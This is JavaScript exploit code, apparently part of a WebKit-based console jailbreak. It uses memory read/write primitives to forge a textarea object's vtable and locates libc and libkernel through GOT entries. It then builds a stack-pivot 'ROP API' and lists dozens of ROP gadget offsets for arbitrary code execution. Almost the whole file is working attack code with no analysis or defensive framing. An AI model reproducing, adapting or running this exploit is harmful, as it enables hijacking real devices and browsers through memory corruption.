var tarea = document.createElement('textarea');

var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);

var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

function get_got_addr(idx)
{
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry";
    var offset = 0;
    for(var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

//these are not real bases but rather some low addresses
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705)-0x10000;
var libc_base = get_got_addr(582);
var saveall_addr = libc_base+0x2e2c8;
var loadall_addr = libc_base+0x3275c;
var setjmp_addr = libc_base+0xbfae0;
var longjmp_addr = libc_base+0xbfb30;
var pivot_addr = libc_base+0x327d2;
var infloop_addr = libc_base+0x447a0;
var jop_frame_addr = libc_base+0x715d0;
var get_errno_addr_addr = libkernel_base+0x9ff0;
var pthread_create_addr = libkernel_base+0xf980;

function saveall()
{
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr+0x38, 0x1234);
    tarea.scrollLeft = 0;
    write_mem(ans+0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
    tarea.scrollLeft = 0;
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable+0x1d8);
    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr+0x38, buf);
    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
    write_ptr_at(buf, ans);
    tarea.scrollLeft = 0;
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}

//funciones 
_4GB=4294967296;
lb=libc_base;
wb=webkit_base;
fun=[
wb+1838146,	//add rax, rcx
lb+547636,	//add rax, rsi
wb+5202439,	//and rax, rcx
wb+14959219,//cmp rax, rcx ; sete al
wb+11676600,//cmp rax, rsi ; sete al
wb+1506828,	//imul rax, rcx
wb+865136,	//mov [rax], cl
wb+954100,	//mov [rax], ecx
wb+2997875,	//mov [rax], rcx
wb+14461559,//mov [rax], rdi
wb+8975893,	//mov [rdi + 0x1;0], r8
wb+1026352,	//mov [rdi + 0x1;0], r9
lb+562536,	//mov [rdi], cx
lb+471355,	//mov [rdi], rax
wb+7438103,	//mov [rsi], rax
lb+270096,	//mov al, [rdi]
lb+270800,	//mov ax, [rdi]
lb+191169,	//mov eax, [rdi]
lb+186490,	//mov rax, [rax]
lb+191168,	//mov rax, [rdi]
wb+1786005,	//mov rax, r11
lb+759626,	//mov rax, r8
lb+882884,	//mov rax, rcx
lb+50775,	//mov rax, rdi
lb+877877,	//mov rax, rdx
lb+272260,	//mov rax, rsi
lb+547950,	//mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
lb+785097,	//mov rsp, rbp ; pop rbp
wb+6227286,	//movsxd rax, edi
lb+269973,	//movzx eax, al
lb+11,	    //nop
wb+75236,	//or rax, rcx
wb+3750700,	//pop r11 ; mov rax, rdi
wb+432898,	//pop r8
wb+10235455,//pop r9
lb+788575,	//pop rax
lb+792472,	//pop rcx
lb+206806,	//pop rdi
wb+105267,	//pop rdx
lb+793877,	//pop rsi
lb+811575,	//pop rsp
lb+523896,	//sar edi, cl
wb+48555,	//setl al
wb+8824269,	//setle al
lb+389047,	//setne al
wb+414627,	//shl rax, 3
lb+877546,	//shl rax, cl
lb+877568,	//shr rax, cl
lb+877175,	//sub rax, rcx ; sbb rdx, rcx
lb+248252,	//sub rdi, rsi ; mov rdx, rdi
lb+785193,	//xor rax, rax
lb+582033,	//??
lb+785347,	//??
];
rca=null;
rco=0; 
function db(data){}
alfa=[...'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'];
valores=Array(41);
for(_i=0;_i<valores.length;_i++)
	valores[_i]=_i;
valores.push(56,128,168,176,184,192,200,208,312,4096,15651,65280,65536,16777343,
-0x1,-0x8,-0xc,-0xd,-0x10,-0x14,-0x18,-0x1c,-0x1e,-0x1f,-0x20,-0x24,-0x26,-0x27,-0x28,-0x2c,
-0x30,-0x34,-0x38,-0x50,-0x68,-0xb8,-0xc0,-0xc8,-0xd0,-0xd8,-0xe0,-0x838);
for(_i=0,_j=0;_i<valores.length;_i++,_j++){
	e=((_i>=alfa.length)?'y':'x')+alfa[(_i==alfa.length)?_j=0:_j]+'=db(['+((valores[_i]<0)?(_4GB+valores[_i])+','+(_4GB-1):valores[_i]+',0')+']);';
    eval(e);
    console.log(e+' //'+valores[_i]);
}
